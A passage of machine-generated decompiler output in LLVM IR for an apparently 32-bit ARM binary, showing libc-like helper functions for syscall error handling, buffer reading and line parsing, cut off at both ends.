  %v2_145d8 = inttoptr i32 %v0_145d0 to i32*
  store i32 %v1_145d4, i32* %v2_145d8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_145e4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_145e0

dec_label_pc_145e0:                               ; preds = %dec_label_pc_145b8, %dec_label_pc_145d0
  %v2_145e4 = phi i32 [ %v3_145b8, %dec_label_pc_145b8 ], [ %v2_145e4.pre, %dec_label_pc_145d0 ]
  %v0_145e0 = phi i32 [ %arg1, %dec_label_pc_145b8 ], [ -1, %dec_label_pc_145d0 ]
  store i32 %v2_145e4, i32* @r7, align 4
  ret i32 %v0_145e0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_145e0, { 1, 0 }
}

define i32 @function_145ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_145ec:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14620, label %dec_label_pc_14610

dec_label_pc_14610:                               ; preds = %dec_label_pc_145ec
  %v0_14610 = call i32 @function_11734()
  %v0_14614 = load i32, i32* %r4.global-to-local, align 4
  %v1_14614 = sub i32 0, %v0_14614
  %v2_14618 = inttoptr i32 %v0_14610 to i32*
  store i32 %v1_14614, i32* %v2_14618, align 4
  br label %dec_label_pc_14620

dec_label_pc_14620:                               ; preds = %dec_label_pc_145ec, %dec_label_pc_14610
  %v1_14628 = phi i32 [ %arg1, %dec_label_pc_145ec ], [ -1, %dec_label_pc_14610 ]
  ret i32 %v1_14628

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14620, { 1, 0 }
}

define i32 @function_1462c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1462c:
  %v1_1463c = load i32, i32* @r0, align 4
  ret i32 %v1_1463c
}

define i32 @function_14640(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14640:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14640 = load i32, i32* @r7, align 4
  store i32 %v3_14640, i32* %stack_var_-8, align 4
  %v0_1464c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1464c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1464c, -4095
  br i1 %tmp, label %dec_label_pc_1466c, label %dec_label_pc_1465c

dec_label_pc_1465c:                               ; preds = %dec_label_pc_14640
  %v0_1465c = call i32 @function_11734()
  %v0_14660 = load i32, i32* %r7.global-to-local, align 4
  %v1_14660 = sub i32 0, %v0_14660
  %v2_14664 = inttoptr i32 %v0_1465c to i32*
  store i32 %v1_14660, i32* %v2_14664, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1466c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1466c

dec_label_pc_1466c:                               ; preds = %dec_label_pc_14640, %dec_label_pc_1465c
  %v1_14670 = phi i32 [ %v0_1464c, %dec_label_pc_14640 ], [ -1, %dec_label_pc_1465c ]
  %v2_1466c = phi i32 [ %v3_14640, %dec_label_pc_14640 ], [ %v2_1466c.pre, %dec_label_pc_1465c ]
  store i32 %v2_1466c, i32* @r7, align 4
  ret i32 %v1_14670

; uselistorder directives
  uselistorder i32 %v0_1464c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1466c, { 1, 0 }
}

define i32 @function_14674(i32 %arg1) local_unnamed_addr {
dec_label_pc_14674:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14678.outer

dec_label_pc_14678.outer:                         ; preds = %dec_label_pc_14690, %dec_label_pc_14674
  %v0_14678.ph = phi i32 [ %v0_14678.pre.pre, %dec_label_pc_14690 ], [ %arg1, %dec_label_pc_14674 ]
  %tmp = icmp ult i32 %v0_14678.ph, -4095
  br label %dec_label_pc_14678

dec_label_pc_14678:                               ; preds = %dec_label_pc_14678.outer, %dec_label_pc_14678
  br i1 %tmp, label %dec_label_pc_14678, label %dec_label_pc_14690

dec_label_pc_14690:                               ; preds = %dec_label_pc_14678
  %v0_14690 = call i32 @function_11734()
  %v1_14694 = sub i32 0, %v0_14678.ph
  %v2_14698 = inttoptr i32 %v0_14690 to i32*
  store i32 %v1_14694, i32* %v2_14698, align 4
  %v0_14678.pre.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14678.outer

; uselistorder directives
  uselistorder i32 %v0_14678.ph, { 1, 0 }
  uselistorder label %dec_label_pc_14678, { 1, 0 }
}

define i32 @function_146a0(i32* %arg1) local_unnamed_addr {
dec_label_pc_146a0:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 126992, i32* @r6, align 4
  %v1_146b4 = add i32 %tmp, 24
  store i32 %v1_146b4, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_146cc = load i32, i32* inttoptr (i32 127064 to i32*), align 8
  store i32 %v4_146cc, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_146cc)
  %v0_146e0 = load i32, i32* @r6, align 4
  %v2_146e0 = add i32 %v0_146e0, 16
  %v3_146e0 = inttoptr i32 %v2_146e0 to i32*
  %v4_146e0 = load i32, i32* %v3_146e0, align 4
  store i32 %v4_146e0, i32* %ip.global-to-local, align 4
  store i32 83692, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_146e0)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_146f0

dec_label_pc_146f0:                               ; preds = %dec_label_pc_14720, %dec_label_pc_146a0
  %v0_146f0 = load i32, i32* @r5, align 4
  %v1_146f0 = add i32 %v0_146f0, 4
  %v2_146f0 = inttoptr i32 %v1_146f0 to i32*
  %v3_146f0 = load i32, i32* %v2_146f0, align 4
  %v4_146f0 = add i32 %v0_146f0, 8
  %v5_146f0 = inttoptr i32 %v4_146f0 to i32*
  %v6_146f0 = load i32, i32* %v5_146f0, align 4
  %tmp10 = icmp ugt i32 %v6_146f0, %v3_146f0
  br i1 %tmp10, label %dec_label_pc_14720, label %dec_label_pc_146fc

dec_label_pc_146fc:                               ; preds = %dec_label_pc_146f0
  %v1_146fc = inttoptr i32 %v0_146f0 to i32*
  %v2_146fc = load i32, i32* %v1_146fc, align 4
  %v1_14700 = add i32 %v0_146f0, 12
  %v2_14700 = inttoptr i32 %v1_14700 to i32*
  %v3_14700 = load i32, i32* %v2_14700, align 4
  %v1_14704 = add i32 %v0_146f0, 20
  %v2_14704 = inttoptr i32 %v1_14704 to i32*
  %v3_14704 = load i32, i32* %v2_14704, align 4
  %v4_14708 = inttoptr i32 %v3_14700 to i32*
  %v5_14708 = call i32 @function_162cc(i32 %v2_146fc, i32* %v4_14708, i32 %v3_14704, i32 %v6_146f0)
  %tmp9 = icmp slt i32 %v5_14708, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_14718

.thread:                                          ; preds = %dec_label_pc_146fc
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_14750

dec_label_pc_14718:                               ; preds = %dec_label_pc_146fc
  %v1_14718 = load i32, i32* @r5, align 4
  %v2_14718 = add i32 %v1_14718, 8
  %v3_14718 = inttoptr i32 %v2_14718 to i32*
  store i32 %v5_14708, i32* %v3_14718, align 4
  %v0_1471c = load i32, i32* @r7, align 4
  %v1_1471c = load i32, i32* @r5, align 4
  %v2_1471c = add i32 %v1_1471c, 4
  %v3_1471c = inttoptr i32 %v2_1471c to i32*
  store i32 %v0_1471c, i32* %v3_1471c, align 4
  %v0_14720.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14720

dec_label_pc_14720:                               ; preds = %dec_label_pc_146f0, %dec_label_pc_14718
  %v1_14744 = phi i32 [ %v0_146f0, %dec_label_pc_146f0 ], [ %v0_14720.pre, %dec_label_pc_14718 ]
  %v1_14720 = add i32 %v1_14744, 4
  %v2_14720 = inttoptr i32 %v1_14720 to i32*
  %v3_14720 = load i32, i32* %v2_14720, align 4
  %v1_14724 = add i32 %v1_14744, 12
  %v2_14724 = inttoptr i32 %v1_14724 to i32*
  %v3_14724 = load i32, i32* %v2_14724, align 4
  %v2_14728 = add i32 %v3_14724, %v3_14720
  store i32 %v2_14728, i32* @r4, align 4
  %v3_1472c = inttoptr i32 %v2_14728 to i32*
  %v4_1472c = load i32, i32* %v3_1472c, align 4
  %v1_14730 = add i32 %v2_14728, 4
  %v2_14730 = inttoptr i32 %v1_14730 to i32*
  %v3_14730 = load i32, i32* %v2_14730, align 4
  %v1_14734 = add i32 %v2_14728, 16
  %v2_14734 = inttoptr i32 %v1_14734 to i16*
  %v3_14734 = load i16, i16* %v2_14734, align 2
  %v4_14734 = zext i16 %v3_14734 to i32
  %v1_14738 = add i32 %v2_14728, 8
  %v2_14738 = inttoptr i32 %v1_14738 to i32*
  %v3_14738 = load i32, i32* %v2_14738, align 4
  store i32 %v3_14738, i32* %ip.global-to-local, align 4
  %v2_1473c = add i32 %v4_14734, %v3_14720
  %v2_14740 = or i32 %v3_14730, %v4_1472c
  %v4_14740 = icmp eq i32 %v2_14740, 0
  store i32 %v2_1473c, i32* %v2_14720, align 4
  %v0_14748 = load i32, i32* %ip.global-to-local, align 4
  %v1_14748 = load i32, i32* @r5, align 4
  %v2_14748 = add i32 %v1_14748, 16
  %v3_14748 = inttoptr i32 %v2_14748 to i32*
  store i32 %v0_14748, i32* %v3_14748, align 4
  br i1 %v4_14740, label %dec_label_pc_146f0, label %dec_label_pc_14750

dec_label_pc_14750:                               ; preds = %dec_label_pc_14720, %.thread
  %v0_1475c = load i32, i32* @r6, align 4
  %v2_1475c = add i32 %v0_1475c, 24
  %v3_1475c = inttoptr i32 %v2_1475c to i32*
  %v4_1475c = load i32, i32* %v3_1475c, align 4
  store i32 %v4_1475c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1475c)
  %v0_14768 = load i32, i32* @r4, align 4
  ret i32 %v0_14768

; uselistorder directives
  uselistorder i32 %v2_14728, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_14744, { 1, 0 }
  uselistorder i32 %v6_146f0, { 1, 0 }
  uselistorder i32 %v0_146f0, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_14720, { 1, 0 }
}

define i32 @function_1477c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1477c:
  %v0_1477c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1477c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1477c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1477c, %bb
  %v10_14788 = phi i32 [ %arg1, %dec_label_pc_1477c ], [ 0, %bb ]
  ret i32 %v10_14788

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_1478c(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1478c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_1478c = load i32, i32* @r4, align 4
  %v6_1478c = load i32, i32* @r5, align 4
  %v9_1478c = load i32, i32* @r6, align 4
  %v12_1478c = load i32, i32* @r7, align 4
  %v15_1478c = load i32, i32* @r8, align 4
  %v18_1478c = load i32, i32* @sb, align 4
  %v21_1478c = load i32, i32* @sl, align 4
  %v24_1478c = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_14790 = icmp eq i32* %arg1, null
  store i1 %v2_14790, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_14790, label %dec_label_pc_14aa0, label %dec_label_pc_147a8

dec_label_pc_147a8:                               ; preds = %dec_label_pc_1478c
  %v1_147a8 = urem i32 %arg3, 256
  store i32 %v1_147a8, i32* @sb, align 4
  %v1_147ac = udiv i32 %arg3, 256
  %v3_147b0 = urem i32 %v1_147ac, 256
  %v3_147b4 = mul nuw nsw i32 %v1_147a8, 4
  %v1_147bc = or i32 %v3_147b4, 1
  %v1_147c8 = and i32 %arg3, 131072
  %v1_147cc = add nsw i32 %v1_147a8, -1
  %v1_147d8 = and i32 %arg3, 262144
  store i32 %v1_147d8, i32* %r2.global-to-local, align 4
  %v1_147dc = and i32 %arg3, 65536
  store i32 %v1_147dc, i32* %r3.global-to-local, align 4
  store i32 %v1_147dc, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_147ec = add i32 %arg4, 1
  store i32 %v1_147ec, i32* @sl, align 4
  %v2_1496c = inttoptr i32 %arg2 to i32*
  %v2_1497c = icmp eq i32 %v1_147c8, 0
  %v2_149d4 = icmp eq i32 %v1_147d8, 0
  br label %dec_label_pc_147f0

dec_label_pc_147f0:                               ; preds = %dec_label_pc_147f0.backedge, %dec_label_pc_147a8
  %v2_1480c = phi i32 [ %v0_147f0.pre, %dec_label_pc_147f0.backedge ], [ %tmp, %dec_label_pc_147a8 ]
  %v1_147f0 = add i32 %v2_1480c, 4
  %v2_147f0 = inttoptr i32 %v1_147f0 to i32*
  %v3_147f0 = load i32, i32* %v2_147f0, align 4
  store i32 %v3_147f0, i32* %r3.global-to-local, align 4
  %v2_147f4 = icmp eq i32 %v3_147f0, 0
  store i1 %v2_147f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_147f4, label %dec_label_pc_147fc, label %dec_label_pc_14844

dec_label_pc_147fc:                               ; preds = %dec_label_pc_147f0
  %v1_147fc = add i32 %v2_1480c, 16
  %v2_147fc = inttoptr i32 %v1_147fc to i32*
  %v3_147fc = load i32, i32* %v2_147fc, align 4
  store i32 %v3_147fc, i32* %r3.global-to-local, align 4
  %v2_14800 = icmp eq i32 %v3_147fc, 0
  store i1 %v2_14800, i1* %cpsr_z.global-to-local, align 1
  %v1_14804 = add i32 %v2_1480c, 8
  %v2_14804 = inttoptr i32 %v1_14804 to i32*
  %v3_14804 = load i32, i32* %v2_14804, align 4
  store i32 %v3_14804, i32* %r3.global-to-local, align 4
  br i1 %v2_14800, label %bb, label %bb66

bb:                                               ; preds = %dec_label_pc_147fc
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_147fc, align 4
  %v0_14810.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_147fc, %bb
  %v0_14810 = phi i32 [ %v0_14810.pre, %bb ], [ %v3_14804, %dec_label_pc_147fc ]
  %v2_14810 = icmp eq i32 %v0_14810, 0
  store i1 %v2_14810, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14810, label %bb67, label %.thread

bb67:                                             ; preds = %bb66
  store i32 %v1_147bc, i32* %r3.global-to-local, align 4
  %v2_14818 = load i32, i32* @r5, align 4
  %v3_14818 = add i32 %v2_14818, 8
  %v4_14818 = inttoptr i32 %v3_14818 to i32*
  store i32 %v1_147bc, i32* %v4_14818, align 4
  br label %.thread

.thread:                                          ; preds = %bb66, %bb67
  %v0_1481c = load i32, i32* @r5, align 4
  %v1_1481c = add i32 %v0_1481c, 16
  %v2_1481c = inttoptr i32 %v1_1481c to i32*
  %v3_1481c = load i32, i32* %v2_1481c, align 4
  store i32 %v3_1481c, i32* %r0.global-to-local, align 4
  %v1_14820 = add i32 %v0_1481c, 8
  %v2_14820 = inttoptr i32 %v1_14820 to i32*
  %v3_14820 = load i32, i32* %v2_14820, align 4
  store i32 %v3_14820, i32* %r3.global-to-local, align 4
  %v2_14824 = add i32 %v3_14820, %v3_1481c
  store i32 %v2_14824, i32* @r0, align 4
  %v0_14828 = call i32 @function_11d34()
  store i32 %v0_14828, i32* %r0.global-to-local, align 4
  %v2_1482c = icmp eq i32 %v0_14828, 0
  store i1 %v2_1482c, i1* %cpsr_z.global-to-local, align 1
  %v1_14830 = load i32, i32* @r5, align 4
  %v2_14830 = add i32 %v1_14830, 4
  %v3_14830 = inttoptr i32 %v2_14830 to i32*
  store i32 %v0_14828, i32* %v3_14830, align 4
  br i1 %v2_1482c, label %dec_label_pc_14aa0, label %dec_label_pc_14838

dec_label_pc_14838:                               ; preds = %.thread
  %v0_14838 = load i32, i32* @r5, align 4
  %v1_14838 = add i32 %v0_14838, 20
  %v2_14838 = inttoptr i32 %v1_14838 to i32*
  %v3_14838 = load i32, i32* %v2_14838, align 4
  %v1_1483c = or i32 %v3_14838, 1
  store i32 %v1_1483c, i32* %r3.global-to-local, align 4
  store i32 %v1_1483c, i32* %v2_14838, align 4
  %v0_14844.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14844

dec_label_pc_14844:                               ; preds = %dec_label_pc_147f0, %dec_label_pc_14838
  %v1_1484c = phi i32 [ %v2_1480c, %dec_label_pc_147f0 ], [ %v0_14844.pre, %dec_label_pc_14838 ]
  %v1_14844 = add i32 %v1_1484c, 4
  %v2_14844 = inttoptr i32 %v1_14844 to i32*
  %v3_14844 = load i32, i32* %v2_14844, align 4
  store i32 %v3_14844, i32* %r2.global-to-local, align 4
  %v4_14844 = add i32 %v1_1484c, 8
  %v5_14844 = inttoptr i32 %v4_14844 to i32*
  %v6_14844 = load i32, i32* %v5_14844, align 4
  %v2_14848 = add i32 %v6_14844, %v3_14844
  store i32 %v2_14848, i32* %r3.global-to-local, align 4
  %v2_1484c = add i32 %v1_1484c, 12
  %v3_1484c = inttoptr i32 %v2_1484c to i32*
  store i32 %v2_14848, i32* %v3_1484c, align 4
  %v0_14850 = load i32, i32* @fp, align 4
  store i32 %v0_14850, i32* @r6, align 4
  br label %dec_label_pc_14854

dec_label_pc_14854:                               ; preds = %dec_label_pc_148e0, %dec_label_pc_148cc, %dec_label_pc_14844
  %v0_1485c = phi i32 [ %v0_14850, %dec_label_pc_14844 ], [ %v1_148cc, %dec_label_pc_148cc ], [ %v0_1485c.pre.pre, %dec_label_pc_148e0 ]
  %v0_14854 = load i32, i32* @r5, align 4
  %v1_14854 = add i32 %v0_14854, 12
  store i32 %v1_14854, i32* %r0.global-to-local, align 4
  %v1_14858 = inttoptr i32 %v1_14854 to i32*
  %v2_14858 = load i32, i32* %v1_14858, align 4
  store i32 %v2_14858, i32* %r0.global-to-local, align 4
  %v3_14858 = add i32 %v0_14854, 16
  %v4_14858 = inttoptr i32 %v3_14858 to i32*
  %v5_14858 = load i32, i32* %v4_14858, align 4
  %v2_1485c = add i32 %v2_14858, %v0_1485c
  store i32 %v2_1485c, i32* %r0.global-to-local, align 4
  %v2_14860 = sub i32 %v5_14858, %v0_1485c
  %v1_14864 = inttoptr i32 %v0_14854 to i32*
  %v2_14864 = load i32, i32* %v1_14864, align 4
  store i32 %v2_14864, i32* %r2.global-to-local, align 4
  %v3_14868 = call i32 @function_15288(i32 %v2_1485c, i32 %v2_14860, i32 %v2_14864)
  store i32 %v3_14868, i32* %r0.global-to-local, align 4
  store i32 %v3_14868, i32* %r4.global-to-local, align 4
  %v2_1486c = icmp eq i32 %v3_14868, 0
  store i1 %v2_1486c, i1* %cpsr_z.global-to-local, align 1
  %v0_14874 = load i32, i32* @r5, align 4
  %v1_14874 = add i32 %v0_14874, 12
  br i1 %v2_1486c, label %dec_label_pc_14874, label %dec_label_pc_1488c

dec_label_pc_14874:                               ; preds = %dec_label_pc_14854
  store i32 %v1_14874, i32* %r0.global-to-local, align 4
  %v1_14878 = inttoptr i32 %v1_14874 to i32*
  %v2_14878 = load i32, i32* %v1_14878, align 4
  store i32 %v2_14878, i32* %r0.global-to-local, align 4
  %v3_14878 = add i32 %v0_14874, 16
  %v4_14878 = inttoptr i32 %v3_14878 to i32*
  %v5_14878 = load i32, i32* %v4_14878, align 4
  store i32 %v5_14878, i32* @r2, align 4
  %v2_14880 = inttoptr i32 %v2_14878 to i8*
  %v3_14880 = call i32 @function_11790(i8* %v2_14880, i32 0)
  store i32 %v3_14880, i32* %r0.global-to-local, align 4
  %v0_14884 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14aa4

dec_label_pc_1488c:                               ; preds = %dec_label_pc_14854
  %v2_1488c = inttoptr i32 %v1_14874 to i32*
  %v3_1488c = load i32, i32* %v2_1488c, align 4
  store i32 %v3_1488c, i32* @r4, align 4
  %v1_14890 = load i32, i32* @r6, align 4
  %v2_14890 = add i32 %v1_14890, %v3_1488c
  store i32 %v2_14890, i32* %r0.global-to-local, align 4
  %v1_14894 = call i32 @function_15d40(i32 %v2_14890)
  %v0_1489c = load i32, i32* @r6, align 4
  %v2_1489c = add i32 %v0_1489c, %v1_14894
  store i32 %v2_1489c, i32* @r6, align 4
  %v0_148a0 = load i32, i32* @r4, align 4
  store i32 %v0_148a0, i32* @r0, align 4
  %v2_148a4 = call i32 @function_15f8c(i32 %v0_148a0, i32 10)
  store i32 %v2_148a4, i32* %r0.global-to-local, align 4
  %v2_148a8 = icmp eq i32 %v2_148a4, 0
  store i1 %v2_148a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_148a8, label %dec_label_pc_148d4, label %dec_label_pc_148b0

dec_label_pc_148b0:                               ; preds = %dec_label_pc_1488c
  %v1_148b0 = inttoptr i32 %v2_148a4 to i8*
  %v2_148b0 = load i8, i8* %v1_148b0, align 1
  %v3_148b0 = zext i8 %v2_148b0 to i32
  %v1_148b4 = add nuw nsw i32 %v3_148b0, 255
  %v1_148b8 = urem i32 %v1_148b4, 256
  store i32 %v1_148b8, i32* %r3.global-to-local, align 4
  %v7_148bc = icmp eq i32 %v1_148b8, 92
  store i1 %v7_148bc, i1* %cpsr_z.global-to-local, align 1
  %v1_148c0 = trunc i32 %v1_148b4 to i8
  store i8 %v1_148c0, i8* %v1_148b0, align 1
  %v0_148c4 = load i32, i32* @r6, align 4
  %v1_148c4 = add i32 %v0_148c4, -1
  store i32 %v1_148c4, i32* @r6, align 4
  %v0_148c8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_148c8, label %dec_label_pc_148cc, label %dec_label_pc_14958

dec_label_pc_148cc:                               ; preds = %dec_label_pc_148b0
  %v1_148cc = add i32 %v0_148c4, -2
  store i32 %v1_148cc, i32* @r6, align 4
  br label %dec_label_pc_14854

dec_label_pc_148d4:                               ; preds = %dec_label_pc_1488c
  %v0_148d4 = load i32, i32* @r5, align 4
  %v1_148d4 = add i32 %v0_148d4, 20
  %v2_148d4 = inttoptr i32 %v1_148d4 to i32*
  %v3_148d4 = load i32, i32* %v2_148d4, align 4
  store i32 %v3_148d4, i32* %r3.global-to-local, align 4
  %v2_148d8 = icmp eq i32 %v3_148d4, 0
  store i1 %v2_148d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_148d8, label %dec_label_pc_14910, label %dec_label_pc_148e0

dec_label_pc_148e0:                               ; preds = %dec_label_pc_148d4
  %v1_148e0 = add i32 %v0_148d4, 16
  %v2_148e0 = inttoptr i32 %v1_148e0 to i32*
  %v3_148e0 = load i32, i32* %v2_148e0, align 4
  store i32 %v3_148e0, i32* %r3.global-to-local, align 4
  %v1_148e4 = add i32 %v0_148d4, 8
  %v2_148e4 = inttoptr i32 %v1_148e4 to i32*
  %v3_148e4 = load i32, i32* %v2_148e4, align 4
  %v1_148e8 = add i32 %v3_148e0, 4096
  store i32 %v1_148e8, i32* %r3.global-to-local, align 4
  %v2_148ec = add i32 %v3_148e4, %v1_148e8
  store i32 %v1_148e8, i32* %v2_148e0, align 4
  %v0_148f4 = load i32, i32* @r5, align 4
  %v1_148f4 = add i32 %v0_148f4, 4
  %v2_148f4 = inttoptr i32 %v1_148f4 to i32*
  %v3_148f4 = load i32, i32* %v2_148f4, align 4
  store i32 %v3_148f4, i32* %r0.global-to-local, align 4
  %v4_148f8 = inttoptr i32 %v3_148f4 to i32*
  %v5_148f8 = call i32 @function_12788(i32* %v4_148f8, i32 %v2_148ec, i32 %v2_14864, i32 %v1_148e8)
  store i32 %v5_148f8, i32* %r0.global-to-local, align 4
  %v0_148fc = load i32, i32* @r5, align 4
  %v1_148fc = add i32 %v0_148fc, 8
  %v2_148fc = inttoptr i32 %v1_148fc to i32*
  %v3_148fc = load i32, i32* %v2_148fc, align 4
  %v2_14900 = add i32 %v3_148fc, %v5_148f8
  store i32 %v2_14900, i32* %r3.global-to-local, align 4
  %v2_14904 = add i32 %v0_148fc, 12
  %v3_14904 = inttoptr i32 %v2_14904 to i32*
  store i32 %v2_14900, i32* %v3_14904, align 4
  %v1_14908 = load i32, i32* @r5, align 4
  %v2_14908 = add i32 %v1_14908, 4
  %v3_14908 = inttoptr i32 %v2_14908 to i32*
  store i32 %v5_148f8, i32* %v3_14908, align 4
  %v0_1485c.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14854

dec_label_pc_14910:                               ; preds = %dec_label_pc_148d4, %.dec_label_pc_14910_crit_edge
  %v0_14910 = phi i32 [ %v0_14910.pre, %.dec_label_pc_14910_crit_edge ], [ %v0_148d4, %dec_label_pc_148d4 ]
  %v1_14910 = inttoptr i32 %v0_14910 to i32*
  %v2_14910 = load i32, i32* %v1_14910, align 4
  %v1_14914 = add i32 %v2_14910, 52
  %v2_14914 = inttoptr i32 %v1_14914 to i32*
  %v3_14914 = load i32, i32* %v2_14914, align 4
  store i32 %v3_14914, i32* %r3.global-to-local, align 4
  %v2_14918 = icmp eq i32 %v3_14914, 0
  store i1 %v2_14918, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14918, label %dec_label_pc_14944, label %dec_label_pc_14920

dec_label_pc_14920:                               ; preds = %dec_label_pc_14910
  %v1_14920 = add i32 %v2_14910, 16
  %v2_14920 = inttoptr i32 %v1_14920 to i32*
  %v3_14920 = load i32, i32* %v2_14920, align 4
  store i32 %v3_14920, i32* %r2.global-to-local, align 4
  %v1_14924 = add i32 %v2_14910, 24
  %v2_14924 = inttoptr i32 %v1_14924 to i32*
  %v3_14924 = load i32, i32* %v2_14924, align 4
  store i32 %v3_14924, i32* %r3.global-to-local, align 4
  %v3_14928 = icmp ult i32 %v3_14920, %v3_14924
  %v9_14928 = icmp eq i32 %v3_14920, %v3_14924
  store i1 %v9_14928, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14928, label %dec_label_pc_1494cthread-pre-split, label %dec_label_pc_14938

dec_label_pc_14938:                               ; preds = %dec_label_pc_14920
  store i32 %v2_14910, i32* %r0.global-to-local, align 4
  %v1_1493c = inttoptr i32 %v2_14910 to i16*
  %v2_1493c = call i32 @function_156d8(i16* %v1_1493c)
  store i32 %v2_1493c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1494c

dec_label_pc_14944:                               ; preds = %dec_label_pc_14910
  store i32 %v2_14910, i32* %r0.global-to-local, align 4
  %v1_14948 = call i32 @function_151ac(i32 %v2_14910)
  store i32 %v1_14948, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1494c

dec_label_pc_1494cthread-pre-split:               ; preds = %dec_label_pc_14920
  %v2_1492c = inttoptr i32 %v3_14920 to i8*
  %v3_1492c = load i8, i8* %v2_1492c, align 1
  %v4_1492c = zext i8 %v3_1492c to i32
  store i32 %v4_1492c, i32* %r0.global-to-local, align 4
  %v6_1492c = add i32 %v3_14920, 1
  store i32 %v6_1492c, i32* %r2.global-to-local, align 4
  store i32 %v6_1492c, i32* %v2_14920, align 4
  %v0_1494c.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1494c

dec_label_pc_1494c:                               ; preds = %dec_label_pc_1494cthread-pre-split, %dec_label_pc_14938, %dec_label_pc_14944
  %v1_14950 = phi i32 [ %v0_1494c.pr, %dec_label_pc_1494cthread-pre-split ], [ %v2_1493c, %dec_label_pc_14938 ], [ %v1_14948, %dec_label_pc_14944 ]
  %v7_1494c = icmp eq i32 %v1_14950, 10
  store i1 %v7_1494c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1494c, label %dec_label_pc_14958.loopexit, label %bb68

bb68:                                             ; preds = %dec_label_pc_1494c
  %v8_14950 = icmp eq i32 %v1_14950, -1
  store i1 %v8_14950, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_14950, label %dec_label_pc_14958.loopexit, label %.dec_label_pc_14910_crit_edge

.dec_label_pc_14910_crit_edge:                    ; preds = %bb68
  %v0_14910.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14910

dec_label_pc_14958.loopexit:                      ; preds = %bb68, %dec_label_pc_1494c
  %v0_14958.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14958

dec_label_pc_14958:                               ; preds = %dec_label_pc_148b0, %dec_label_pc_14958.loopexit
  %v0_14958 = phi i32 [ %v0_14958.pre, %dec_label_pc_14958.loopexit ], [ %v1_148c4, %dec_label_pc_148b0 ]
  %v7_14958 = icmp eq i32 %v0_14958, -1
  store i1 %v7_14958, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14958, label %dec_label_pc_14aa0, label %dec_label_pc_14960

dec_label_pc_14960:                               ; preds = %dec_label_pc_14958
  %v0_14960 = load i32, i32* @r5, align 4
  %v1_14960 = add i32 %v0_14960, 4
